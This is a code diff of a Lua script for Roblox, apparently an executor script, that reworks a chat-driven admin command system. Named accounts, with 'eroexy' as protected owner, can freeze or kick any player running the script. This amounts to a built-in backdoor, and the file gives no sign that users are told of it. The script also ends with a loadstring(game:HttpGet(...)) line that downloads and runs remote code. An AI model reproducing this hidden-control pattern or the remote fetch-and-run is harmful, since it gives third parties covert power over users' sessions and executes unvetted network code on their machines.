@@ -47,13 +47,15 @@ if blacklistedUsers[LocalPlayer.Name] then
 end
 
 ------------------------------------------------
--- ADMIN COMMAND SYSTEM
+-- ADMIN COMMAND SYSTEM (Owner-Protected)
 ------------------------------------------------
 
+local OWNER = "eroexy"  -- Only this dude can mess with you
+
 local ADMINS = {
-    ["eroexy"] = true,
     ["realcrystxll"] = true,
     ["Alternative_QH0L3"] = true,
+    -- You can add more admins here, but they will NEVER affect you
 }
 
 local function freezeMe()
@@ -80,7 +82,7 @@ local function kickMe(reason)
     LocalPlayer:Kick(reason or "Kicked by admin")
 end
 
--- NEW parser supporting parentheses
+-- Parser for commands
 local function parseCommand(msg)
     -- matches: ;kick @player (reason)
     local cmd, target, reason = msg:lower():match("^;(%w+)%s+@(%S+)%s*%((.*)%)$")
@@ -90,8 +92,15 @@ local function parseCommand(msg)
     return msg:lower():match("^;(%w+)%s+@(%S+)%s*(.*)$")
 end
 
-local function runCommand(cmd, target, reason)
-    if target ~= LocalPlayer.Name:lower() then return end
+local function runCommand(cmd, target, reason, speaker)
+    -- Determine if this command targets YOU
+    local targetingMe = (target == LocalPlayer.Name:lower())
+
+    -- If admin tries to hit you → denied
+    if targetingMe and speaker.Name ~= OWNER then
+        warn("Admin " .. speaker.Name .. " tried to target you but was blocked.")
+        return
+    end
 
     if cmd == "freeze" then
         freezeMe()
@@ -102,16 +111,23 @@ local function runCommand(cmd, target, reason)
     end
 end
 
--- LISTEN USING TextChatService (Rayfield compatible)
+-- LISTEN USING TextChatService
 TextChatService.MessageReceived:Connect(function(msg)
-    local speaker = Players:FindFirstChild(msg.TextSource and msg.TextSource.Name)
+    local source = msg.TextSource
+    if not source then return end
+
+    local speaker = Players:FindFirstChild(source.Name)
     if not speaker then return end
-    if not ADMINS[speaker.Name] then return end
+
+    -- Only Owner + Admins allowed to issue commands
+    if speaker.Name ~= OWNER and not ADMINS[speaker.Name] then
+        return
+    end
 
     local cmd, target, reason = parseCommand(msg.Text)
-    if cmd then
-        runCommand(cmd, target, reason)
-    end
+    if not cmd or not target then return end
+
+    runCommand(cmd, target, reason, speaker)
 end)
 --//////////////////////////////////////////////////////////////////////////////
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
